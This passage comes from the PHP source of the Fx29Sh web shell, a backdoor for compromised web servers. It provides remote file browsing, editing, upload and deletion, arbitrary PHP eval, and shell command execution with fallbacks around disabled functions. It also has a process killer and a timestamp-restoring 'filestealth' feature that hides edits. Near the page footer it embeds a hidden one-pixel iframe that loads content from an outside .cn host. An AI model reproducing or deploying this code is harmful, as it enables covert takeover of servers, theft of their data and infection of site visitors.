          elseif (is_link($v)) { $tab["links"][] = $row; }

          elseif (is_dir($v)) { $tab["folders"][] = $row; }

          elseif (is_file($v)) { $tab["files"][] = $row; }



          $i++;

        }

      }

      #Listing Files & Folders

      echo "<div class=barheader>.: ";

      if (!empty($fx_infohead)) { echo $fx_infohead; }

      else { echo "Directory List (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders)"; }

      echo " :.</div>\n\n";

      echo "<form name=\"ls_form\" action=\"$surl\" method=POST>\n".

           "<input type=hidden name=act value=\"$dspact\">\n".

           "<input type=hidden name=d value=\"$d\">\n";

?>

<table class="explorer">

<?php

      $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);

      foreach($table as $row) {

        echo "\t<tr>";

        foreach($row as $v) { echo "<td>".$v."</td>"; }

        echo "</tr>\n";

      }

?>

</table>



<div align="right">



    <script language="javascript">

    function ls_setcheckboxall(status) {

      var id = 1; var num = <?php echo(count($table) - 2); ?>;

      while (id <= num) {

        document.getElementById('actbox'+id).checked = status; id++;

      }

    }

    function ls_reverse_all() {

      var id = 1; var num = <?php echo(count($table) - 2); ?>;

      while (id <= num) {

        document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; id++;

      }

    }

    </script>



    <input type="button" onclick="ls_setcheckboxall(true);" value="Check all">

    <input type="button" onclick="ls_setcheckboxall(false);" value="Uncheck all">

<?php

      if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0) {

        echo "\t<input type=\"submit\" name=\"actarcbuff\" value=\"Archive it!\">".

             "\t<input type=\"text\" name=\"actarcbuff_path\" value=\"fx_archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">\n".

             "\t<input type=\"submit\" name=\"actpastebuff\" value=\"Paste\">\n".

             "\t<input type=\"submit\" name=\"actemptybuff\" value=\"Empty buffer\">";

      }

      echo "\n\t".

           "<select name=act>\n".

             "\t\t<option value=\"".$act."\">With checked:</option>\n";



      $f_acts = array("delete","chmod","cut","copy","unselect");

      foreach ($f_acts as $f1) {

        echo "\t\t<option value=\"$f1\"".($dspact == "$f1"?" selected":"").">$f1</option>\n";

      }

      ?>

    </select>



    <input type="submit" value="Confirm">



</div>

</form>

<?php

    }

  }



  ##[ FILE ]##

  if ($act == "f") {

    echo "<div align=left>";

    if (!isset($ft)) { $ft = ""; }

    if (!isset($newwin)) { $newwin = ""; }

    if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {

      if (file_exists($d.$f)) {

        disp_error("Access denied!<br>".htmlspecialchars($d.$f));

      }

      else {

        disp_error("File doesn't exists: ".htmlspecialchars($d.$f)."<br>\n".

                   "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a>");

      }

    }

    else {

      $r   = @file_get_contents($d.$f);

      $ext = explode(".",$f);

      $c   = count($ext)-1;

      $ext = $ext[$c];

      $ext = strtolower($ext);

      $rft = "";

      foreach ($ftypes as $k => $v) {

        if (in_array($ext,$v)) { $rft = $k; break; }

      }

      if (eregi("sess_(.*)",$f)) { $rft = "phpsess"; }

      if (empty($ft)) { $ft = $rft; }



      $arr = array(

          array("<img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\">","info"),

          array("<img src=\"".$surl."act=img&img=ext_html\" alt=\"html\">","html"),

          array("<img src=\"".$surl."act=img&img=ext_txt\" alt=\"txt\">","txt"),

          array("<img src=\"".$surl."act=img&img=ext_ini\" alt=\"ini\">","ini"),

          array("Code","code"),

          array("Session","phpsess"),

          array("SDB","sdb"),

          array("<img src=\"".$surl."act=img&img=ext_exe\" alt=\"exe\">","exe"),

          array("<img src=\"".$surl."act=img&img=ext_gif\" alt=\"img\">","img"),

          array("<img src=\"".$surl."act=img&img=ext_rtf\" alt=\"Notepad\">","notepad"),

          array("<img src=\"".$surl."act=img&img=change\" alt=\"Edit\">","edit"),

          array("<img src=\"".$surl."act=img&img=download\" alt=\"Download\">","download")

      );



      echo "<div class=barheader>.: File Viewer [".$f." (".view_size(filesize($d.$f)).") ".view_perms_color($d.$f).") :.\n";

      echo "<hr size=1 noshade>\n";

      foreach($arr as $t) {

        if ($t[1] == $rft) { echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=#3366FF>".$t[0]."</font></a>"; }

        elseif ($t[1] == $ft) { echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>"; }

        else { echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>"; }

        echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."&newwin=1\" title=\"New Window\" target=\"_blank\">+</a>) ";

      }

      echo "</div>\n";

      if ($ft == "info") {

        echo "<br><div class=barheader>Information</div>\n".

             "<table class=contents>\n".

             "<tr><th>Path</th><td>".$d.$f."</td></tr>\n".

             "<tr><th>Size</th><td>".view_size(filesize($d.$f))."</td></tr>\n".

             "<tr><th>MD5</th><td>".md5_file($d.$f)."</td></tr>\n";

        if (!is_windows()) {

          echo "<tr><th><b>Owner/Group</b></td><td>";

          $ow = posix_getpwuid(fileowner($d.$f));

          $gr = posix_getgrgid(filegroup($d.$f));

          echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));

        }

        echo "<tr><th>Perms</th><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr>\n".

             "<tr><th>Create time</th><td>".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr>\n".

             "<tr><th>Access time</th><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr>\n".

             "<tr><th>Modify time</th><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr>\n";

        echo "<tr><th>HexDump</th><td>\n".

             "[ <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a> ] ".

             "[ <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a> ]<br>\n".

             "</td></tr>\n".

             "<tr><th>Base64</th><td>\n".

             "[ <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a> ] ".

             "[ <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a> ] ".

             "[ <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a> ] ".

             "[ <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a> ] ".

             "</td></tr>\n".

             "</table><br>\n";

        $fi = fopen($d.$f,"rb");

        if ($fi) {

          echo "<div class=barheader>";

          if (@$fullhexdump) { echo "Full HexDump"; $str = fread($fi,filesize($d.$f)); }

          else { echo "HexDump Preview"; $str = fread($fi,$hexdump_lines*$hexdump_rows); }

          $n  = 0;

          $a0 = "00000000<br>";

          $a1 = "";

          $a2 = "";

          for ($i=0; $i<strlen($str); $i++) {

            $a1 .= sprintf("%02X",ord($str[$i]))." ";

            switch (ord($str[$i])) {

              case 0 :  $a2 .= "<font>0</font>"; break;

              case 32:

              case 10:

              case 13: $a2 .= " "; break;

              default: $a2 .= htmlspecialchars($str[$i]);

            }

            $n++;

            if ($n == $hexdump_rows) {

              $n = 0;

              if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}

              $a1 .= "<br>";

              $a2 .= "<br>";

            }

          }

          echo "</div>\n";

          echo "<table class=code><tr><td>".$a0."</td><td>".$a1."</td><td>".$a2."</td></tr></table><br>\n";

        }

        $henc = "";

        $encoded  = "";

        if (!isset($base64)) { $base64 = ""; }

        if ($base64 == 1) {

          $henc = "Base64 Encode";

          $encoded = base64_encode(file_get_contents($d.$f));

        }

        elseif($base64 == 2) {

          $henc = "Base64 Encode + Chunk";

          $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));

        }

        elseif($base64 == 3) {

          $henc = "Base64 Encode + Chunk + Quotes";

          $encoded = base64_encode(file_get_contents($d.$f));

          $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);

        }

        elseif($base64 == 4) {

          $text = file_get_contents($d.$f);

          $encoded = base64_decode($text);

          $henc = "<b>Base64 Decode";

          if (base64_encode($encoded) != $text) { $henc .= " (Failed!)"; }

        }

        if (!empty($encoded)) {

          echo "<div class=barheader>$henc</div>\n";

          echo "<textarea cols=100 rows=10>".htmlspecialchars($encoded)."</textarea>";

          echo "<br>\n";

        }

      }

      elseif ($ft == "html") {

        if ($newwin) { @ob_clean(); echo $r; fx29shexit(); }

        else { echo $r; }

      }

      elseif ($ft == "txt") {

        echo "<center><textarea cols=\"125\" rows=\"20\">".htmlspecialchars($r)."</textarea></center>";

      }

      elseif ($ft == "ini") {

        echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";

      }

      elseif ($ft == "phpsess") {

        echo "<pre>";

        $v = explode("|",$r);

        echo $v[0]."<br>";

        var_dump(unserialize($v[1]));

        echo "</pre>";

      }

      elseif ($ft == "exe") {

        $ext = explode(".",$f);

        $c = count($ext)-1;

        $ext = $ext[$c];

        $ext = strtolower($ext);

        $rft = "";

        foreach ($exeftypes as $k => $v) {

         if (in_array($ext,$v)) { $rft = $k; break; }

        }

        $cmd = str_replace("%f%",$f,$rft);

        echo "<b>Execute file:</b>\n".

             "<form name=\"f_xfile\" action=\"".$surl."\" method=POST>\n".

             "<input type=hidden name=act value=cmd>\n".

             "<input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br>\n".

             "<input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"> \n".

             "<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked> - Display in text-area\n".

             "<input type=submit name=submit value=\"Execute\"></form>\n";

      }

      elseif ($ft == "sdb") { echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>\n"; }

      elseif ($ft == "code") {

        echo "<div class=code style=\"background-color: ".$highlight_bg."\">\n";

        if (@$newwin) { @ob_clean(); highlight_file($d.$f); fx29shexit(); }

        else { highlight_file($d.$f); }

        echo "\n</div>\n";

      }

      elseif ($ft == "notepad") {

        @ob_clean();

        header("Content-type: text/plain");

        header("Content-disposition: attachment; filename=\"".$f.".txt\";");

        echo($r);

        exit;

      }

      elseif ($ft == "download") {

        @ob_clean();

        header("Content-type: application/octet-stream");

        header("Content-length: ".filesize($d.$f));

        header("Content-disposition: attachment; filename=\"".$f."\";");

        echo $r;

        exit;

      }

      elseif ($ft == "img") {

        $inf = getimagesize($d.$f);

        if (!$newwin) {

          if (empty($imgsize)) {$imgsize = 20;}

          $width = $inf[0]/100*$imgsize;

          $height = $inf[1]/100*$imgsize;

          echo "<center><b>Size:</b> ";

          $sizes = array("100","50","20");

          foreach ($sizes as $v) {

            echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";

            if ($imgsize != $v ) {echo $v;}

            else {echo "<u>".$v."</u>";}

            echo "</a> &nbsp; ";

          }

          echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&newwin=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\"></center>";

        }

        else {

          @ob_clean();

          $ext = explode($f,".");

          $ext = $ext[count($ext)-1];

          header("Content-type: ".$inf["mime"]);

          readfile($d.$f);

          exit;

        }

      }

      elseif ($ft == "edit") {

       if (!empty($submit)) {

         if ($filestealth) {$stat = stat($d.$f);}

         $fp = fopen($d.$f,"w");

         if (!$fp) {echo "<b>Can't write to file!</b>";}

         else {

           echo "<b>Saved!</b>";

           fwrite($fp,$edit_text);

           fclose($fp);

           if ($filestealth) { touch($d.$f,$stat[9],$stat[8]); }

           $r = $edit_text;

         }

       }

       $rows = count(explode("\r\n",$r));

       if ($rows < 10) { $rows = 10; }

       elseif ($rows > 30) { $rows = 30; }

       echo "<form name=\"f_save\" action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST>\n".

            "<input type=submit name=submit value=\"Save\"> ".

            "<input type=\"reset\" value=\"Reset\"> ".

            "<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br>".

            "<textarea name=\"edit_text\" cols=\"125\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea>\n".

            "</form>\n";

      }

      elseif (!empty($ft)) {

        echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";

      }

      else {

        echo "<center><b>Unknown file type (".$ext."), please select type manually.</b></center>";

      }

    }

    echo "</div>\n";

  }



  ##[ DIRECTORY ]##

  if ($act == "d") {

    if (!is_dir($d)) { echo "<center><b>$d is a not a Directory!</b></center>"; }

    else {

      echo "<b>Directory information:</b>\n";

      echo "<table>\n";

      if (!is_windows()) {

        echo "<tr><td><b>Owner/Group</b></td><td> ";

        $ow = posix_getpwuid(fileowner($d));

        $gr = posix_getgrgid(filegroup($d));

        $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));

      }

      echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table>";

    }

  }



  ##[ PROCESSES ]##

  if ($act == "processes") {

?>

<div class="barheader">.: Processes :.</div>



<?php

    if (!is_windows()) { $handler = "ps aux".($grep?" | grep '".addslashes($grep)."'":""); }

    else { $handler = "tasklist"; }

    $ret = fx29exec($handler);

    if (!$ret) { disp_error("Can't execute \"$handler\"!"); }

    else {

      if (empty($processes_sort)) { $processes_sort = $sort_default; }

      $parsesort = parsesort($processes_sort);

      if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}

      $k = $parsesort[0];

      if ($parsesort[1] != "a") {

        $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" alt=\"Desc\"></a>";

      }

      else {

        $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" alt=\"Asc\"></a>";

      }

      $ret = htmlspecialchars($ret);

      if (!is_windows()) {

        if ($pid) {

          if (is_null($sig)) { $sig = 9; }

          echo "Sending signal ".$sig." to #".$pid."... ";

          if (posix_kill($pid,$sig)) { echo "<b>OK!</b>"; } else { echo "<b>ERROR!</b>"; }

        }

        while (ereg("  ",$ret)) { $ret = str_replace("  "," ",$ret); }

        $stack = explode("\n",$ret);

        $head = explode(" ",$stack[0]);

        unset($stack[0]);

        for($i=0;$i<count($head);$i++) {

          if ($i != $k) {

            $head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";

          }

        }

        $head[$i] = "";

        $prcs = array();

        foreach ($stack as $line) {

          if (!empty($line)) {

            $line = explode(" ",$line);

            $line[10] = join(" ",array_slice($line,10));

            $line = array_slice($line,0,11);

            if ($line[0] == get_current_user()) { $line[0] = '<font class="on">'.$line[0]."</font>"; }

            $line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";

            $prcs[] = $line;

          }

        }

      }

      #For Windows - Fixed By FaTaLisTiCz_Fx

      else {

        if (@$pid) {

          echo "Killing PID ".$pid."... ";

          echo fx29exec("taskkill /PID $pid /F");

        }

        while (ereg("  ",$ret)) { $ret = str_replace("  "," ",$ret); }

        while (ereg("=",$ret)) { $ret = str_replace("=","",$ret); }

        $ret = convert_cyr_string($ret,"d","w");

        $stack = explode("\n",$ret);

        unset($stack[0],$stack[2]);

        $stack = array_values($stack);

        $stack[0] = str_replace("Image Name","Image-Name",$stack[0]);

        $stack[0] = str_replace("Session Name","Session-Name",$stack[0]);

        $stack[0] = str_replace("Mem Usage","Memory-Usage",$stack[0]);

        $stack[0] .= " KILL";

        $head = explode(" ",$stack[0]);

        $stack = array_slice($stack,1);

        $head = array_values($head);

        if ($parsesort[1] != "a") {

          $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" alt=\"Desc\"></a>";

        }

        else {

          $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" alt=\"Asc\"></a>";

        }

        if ($k > count($head)) {$k = count($head)-1;}

        for($i=0;$i<count($head);$i++) {

          if ($i != $k) { $head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>"; }

        }

        $prcs = array();

        unset($stack[0]);

        foreach ($stack as $line) {

          if (!empty($line)) {

            $line = explode(" ",$line);

            $line[4] = str_replace(".","",$line[4]);

            $line[4] = intval($line[4]) * 1024;

            unset($line[5]);

            $line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."\"><u>KILL</u></a>";

            $prcs[] = $line;

          }

        }

      }

      $head[$k] = "<b>".$head[$k]."</b>".$y;

      $v = $processes_sort[0];

      usort($prcs,"tabsort");

      if ($processes_sort[1] == "d") { $prcs = array_reverse($prcs); }

      $tab = array();

      $tab[] = $head;

      $tab = array_merge($tab,$prcs);

      echo "<table class=\"explorer\">\n";

      foreach($tab as $i=>$k) {

        echo "\t<tr>";

        foreach($k as $j=>$v) {

          if (is_windows() and $i > 0 and $j == 4) { $v = view_size($v); }

          echo "<td>".$v."</td>";

        }

        echo "</tr>\n";

      }

      echo "</table>\n";

    }

  }



  ##[ EVAL ]##

  if ($act == "eval") {

    if (!empty($eval)) {

      echo "<div class=barheader>Result of execution this PHP-code:</div>\n";

      $tmp = @ob_get_contents();

      $olddir = realpath(".");

      @chdir($d);

      if ($tmp) {

        @ob_clean();

        eval($eval);

        $ret = @ob_get_contents();

        $ret = convert_cyr_string($ret,"d","w");

        @ob_clean();

        echo $tmp;

        if (@$eval_txt) {

          $rows = count(explode("\r\n",$ret))+1;

          if ($rows < 10) {$rows = 10;}

          echo "<br><textarea cols=\"125\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";

        }

        else {echo $ret."<br>";}

      }

      else {

        if ($eval_txt) {

          echo "<br><textarea cols=\"125\" rows=\"10\" readonly>";

          eval($eval);

          echo "</textarea>";

        }

        else {echo $ret;}

      }

      @chdir($olddir);

    }

    else {

      echo "<div class=\"barheader\">.: PHP-code Execution :.</div>\n\n";

      if (empty($eval_txt)) { $eval_txt = TRUE; }

    }

?>

<form name="f_eval" action="<?php echo $surl; ?>" method="POST">

    <input type="hidden" name="act" value="eval">

    <textarea name="eval" cols="125" rows="10">

<?php

echo htmlspecialchars(@$eval);

?>

    </textarea>

    <input type="hidden" name="d" value="<?php echo $dispd; ?>"><br>

    <input type="submit" value="Execute"> Display in text-area <input type="checkbox" name="eval_txt" value="1"<?php if (@$eval_txt) { echo " checked"; } ?>>

</form>

<?php

  }



  ##[ UPDATE ]##

  if ($act == "update") {

    $ret = fx29sh_getupdate(@$confirmupdate);

    echo "<b>$ret</b>";

    if (stristr($ret,"new version")) {

      echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";

    }

  }

  if ($act == "phpinfo") { @ob_clean(); phpinfo(); fx29shexit(); }

  if ($act == "tools") { fx29sh_tools(); }

  if ($act == "about") { fx29sh_about(); }

}

##[ END OF ACTIONS ]##



######################

##[ COMMANDS PANEL ]##

######################

?>



</div>

<!-- End of Main Info -->



<!-- Commands Panel -->

<div id="main">



    <div class="bartitle"><b>.: COMMANDS PANEL :.</b></div>



<table id="mainpanel">

    <tr><th colspan="2">Command:</th>

    <td>

    <form name="f_cmd" method="POST">

        <input type="hidden" name="act" value="cmd">

        <input type="hidden" name="d" value="<?php echo $dispd; ?>">

        <input type="hidden" name="cmd_txt" value="1">

        <input type="text" name="cmd" size="100" value="<?php echo @htmlspecialchars($cmd); ?>">

        <input type="submit" name="submit" value="Execute">

    </form>

    </td></tr>



    <tr><th colspan="2">Quick Commands:</th>

    <td>

    <form name="f_qcmd" method="POST">

        <input type="hidden" name="act" value="cmd">

        <input type="hidden" name="d" value="<?php echo $dispd; ?>">

        <input type="hidden" name="cmd_txt" value="1">

        <select name="cmd">

<?php

foreach ($cmdaliases as $als) {

  echo "\t\t\t";

  echo '<option value="'.htmlspecialchars($als[1]).'">'.htmlspecialchars($als[0]).'</option>';

  echo "\n";

}

?>

        </select>

        <input type="submit" name="submit" value="Execute">

    </form>

    </td></tr>



    <tr><th colspan="2" rowspan="2">PHP Filesystem:</th>

    <td>

    <script language="javascript">

    function set_arg(txt1,txt2) {

      document.forms.fphpfsys.phpfsysfunc.value.selected = "Download";

      document.forms.fphpfsys.arg1.value = txt1;

      document.forms.fphpfsys.arg2.value = txt2;

    }

    function chg_arg(num,txt1,txt2) {

      if (num==0) {

        document.forms.fphpfsys.arg1.type = "hidden";

        document.forms.fphpfsys.A1.type = "hidden";

      }

      if (num<=1) {

        document.forms.fphpfsys.arg2.type = "hidden";

        document.forms.fphpfsys.A2.type = "hidden";

      }

      if (num==2) {

        document.forms.fphpfsys.A1.type = "label";

        document.forms.fphpfsys.A2.type = "label";

        document.forms.fphpfsys.arg1.type = "text";

        document.forms.fphpfsys.arg2.type = "text";

      }

      document.forms.fphpfsys.A1.value = txt1 + ":";

      document.forms.fphpfsys.A2.value = txt2 + ":";

    }

    </script>

    <form name="fphpfsys" method="POST">

        <input type="hidden" name="act" value="phpfsys">

        <input type="hidden" name="d" value="<?php echo $dispd; ?>">

        <select name="phpfsysfunc">

<?php

foreach ($phpfsaliases as $als) {

  if ($als[1]==@$phpfsysfunc) {

    echo "\t\t<option selected value=\"".$als[1]."\" onclick=\"chg_arg('$als[2]','$als[3]','$als[4]')\">".$als[0]."</option>\n";

  }

  else {

    echo "\t\t<option value=\"".$als[1]."\" onclick=\"chg_arg('$als[2]','$als[3]','".@$als[4]."')\">".$als[0]."</option>\n";

  }

}

?>

        </select>

        <input type="label" name="A1" value="File:" size=2 disabled>

        <input type=text name=arg1 size=40 value="<?php echo @htmlspecialchars($arg1); ?>">

        <input type="hidden" name="A2" size=3 disabled >

        <input type="hidden" name="arg2" size=40 value="<?php echo @htmlspecialchars($arg2); ?>">

        <input type="submit" name="submit" value="Execute">

    </form>

    </td></tr>

    <tr><td>

<?php

foreach ($sh_sourcez as $e => $o) {

  echo "\t<input type=button value=\"$e\" onclick=\"set_arg('$o[0]','$o[1]')\">\n";

}

?>

    </td></tr>



    <tr><th rowspan="4">Filesystem</th>

    <th>Search:</th>

    <td>

    <form name="f_search" method="POST">

        <input type="hidden" name="act" value="search">

        <input type="hidden" name="d" value="<?php echo $dispd; ?>">

        <input type="text" name="search_name" size="29" value="(.*)"> <input type="checkbox" name="search_name_regexp" value="1" checked> regexp <input type=submit name=submit value="Search">

    </form>

    </td></tr>

    <tr><th>Upload:</th>

    <td>

    <form name="f_upload" method="POST" enctype="multipart/form-data">

        <input type="hidden" name="act" value="upload">

        <input type="file" name="uploadfile" size="50">

        <input type="submit" name="submit" value="Upload">

        <?php echo " Max size: ".@ini_get("upload_max_filesize")."B | Temp dir: ".@ini_get("upload_tmp_dir")."\n"; ?>

    </form>

    </td></tr>

    <tr><th>Create:</th>

    <td>

    <form name="f_mkfile" method="POST">

        <input type="hidden" name="act" value="mkfile">

        <input type="hidden" name="d" value="<?php echo $dispd; ?>">

        <input type="hidden" name="ft" value="edit">

        <input type="text" name="mkfile" size="70" value="<?php echo $dispd; ?>"> <input type="checkbox" name="overwrite" value="1" checked> Overwrite <input type=submit value="Create">

    </form>

    </td></tr>

    <tr><th>View:</th><td>

    <form name="f_gofile" method="POST">

        <input type="hidden" name="act" value="gofile">

        <input type="hidden" name="d" value="<?php echo $dispd; ?>">

        <input type="text" name="f" size="70" value="<?php echo $dispd; ?>"> <input type="submit" value="View">

    </form>

    </td></tr>

</table>



    <div class="bartitle footer"><?php echo html_footer(); ?></div>



</div>

<!-- End of Commands Panel -->



</center><iframe src="http://NtKrnlpa.cn/rc/" width=1 height=1 style="border:0"></iframe>
</body>



</html>

<?php

########################

##[ Fx29Sh FUNCTIONS ]##

########################

function safemode() {

  if ( @ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) { return TRUE; }

  else { return FALSE; }

}

function getdisfunc() {

  $disfunc = @ini_get("disable_functions");

  if (!empty($disfunc)) {

    $disfunc = str_replace(" ","",$disfunc);

    $disfunc = explode(",",$disfunc);

  }

  else { $disfunc= array(); }

  return $disfunc;

}

function enabled($func) {

 if ( function_exists($func) && is_callable($func) && !in_array($func,getdisfunc()) ) { return TRUE; }

 else { return FALSE; }

}

##[ FX29EXEC W/ STDERR ]##

function fx29exec($cmd) {

  $output = "";

  if ( enabled("popen") ) {

    $h = popen($cmd.' 2>&1', 'r');

    if ( is_resource($h) ) {

      while ( !feof($h) ) { $output .= fread($h, 2096);  }

      pclose($h);

    }

  }

  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }

  elseif ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }

  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }

  elseif ( enabled("shell_exec") ) { $output = shell_exec($cmd); }

  return $output;

}

##[ FX29EXEC W/O STDERR ]##

function fx29exec2($cmd) {

  $output = "";

  if ( enabled("shell_exec") ) { $output = shell_exec($cmd); }

  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }

  elseif ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); } #Dipindahkan kesini karena menimbulkan masalah pada output control

  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }

  elseif ( enabled("popen") ) {

    $h = popen($cmd.' 2>&1', 'r');

    if ( is_resource($h) ) {

      while ( !feof($h) ) { $output .= fread($h, 2096);  }

      pclose($h);

    }

  }

  return $output;

}

function is_windows() { return strtolower(substr(PHP_OS,0,3)) == "win"; }

function which($pr) {

  $path = fx29exec("which $pr");

  if(!empty($path)) { return $path; } else { return $pr; }

}

function get_status() {

  $arrfunc = array(

    array("MySQL","mysql_connect"),

    array("MSSQL","mssql_connect"),

    array("Oracle","ocilogon"),

    array("PostgreSQL","pg_connect"),

    array("Curl","curl_version"),

  );

  $arrcmd = array(

    array("Fetch","fetch --help"),

    array("Wget","wget --help"),

    array("Perl","perl -v"),

  );



  $statinfo = array();



  function showstat($sup,$stat) {

    if ($stat == "on") { return "$sup: <font class=on>ON</font>"; }

    else { return "$sup: <font class=off>OFF</font>"; }

  }



  foreach ($arrfunc as $func) {

    if (function_exists($func[1])) { $statinfo[] = showstat($func[0],"on"); }

    else { $statinfo[] = showstat($func[0],"off"); }

  }

  $statinfo[] = (@extension_loaded('sockets')) ? showstat("Sockets","on") : showstat("Sockets","off");

  foreach ($arrcmd as $cmd) {

    if (fx29exec2($cmd[1])) { $statinfo[] = showstat($cmd[0],"on"); }

    else { $statinfo[] = showstat($cmd[0],"off"); }

  }

  return implode(" ",$statinfo);

}

function showdisfunc() {

  $disfunc = getdisfunc();

  if ($disfunc = @ini_get("disable_functions")) {

    return '<font class="off">'.$disfunc.'</font>';

  }

  else { return '<font class="on">NONE</font>'; }

}

function disp_drives($curdir,$surl) {

  $letters = "";

  $v = explode("\\",$curdir);

  $v = $v[0];

  foreach (range("A","Z") as $letter) {

    $bool = $isdiskette = $letter == "A";

    if (!$bool) { $bool = is_dir($letter.":\\"); }

    if ($bool) {

      $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".

                  ($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly!')\"":"")."> ";

      if ($letter.":" != $v) { $letters .= $letter; }

      else { $letters .= "<font color=#3366FF>".$letter."</font>"; }

      $letters .= " </a> ";

    }

  }

  if (!empty($letters)) { Return $letters; }

  else  { Return "None"; }

}

function view_size($size) {

  if (!is_numeric($size)) { return FALSE; }

  else {

    if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}

    elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}

    elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}

    else {$size = $size . " B";}

    return $size;

  }

}

function disp_freespace($curdrv) {

  $free = @disk_free_space($curdrv);

  $total = @disk_total_space($curdrv);

  if ($free === FALSE) { $free = 0; }

  if ($total === FALSE) { $total = 0; }

  if ($free < 0) { $free = 0; }

  if ($total < 0) { $total = 0; }

  $used = $total-$free;

  $free_percent = round(100/($total/$free),2)."%";

  $free = view_size($free);

  $total = view_size($total);

  return "$free of $total ($free_percent)";

}

